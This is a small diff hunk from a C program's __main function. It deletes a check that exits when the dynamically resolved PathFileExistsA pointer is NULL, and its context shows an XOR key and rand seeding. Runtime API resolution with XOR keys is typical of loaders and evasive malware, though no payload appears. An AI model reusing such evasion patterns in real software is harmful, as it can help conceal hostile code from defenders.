@@ -170,8 +170,6 @@ int __main () {
         XorKey
     );
 
-    if (context.functions.PathFileExistsA == NULL) return 8;
-
     // Set `rand` seed
     context.functions.srand(context.functions.time(NULL));
 
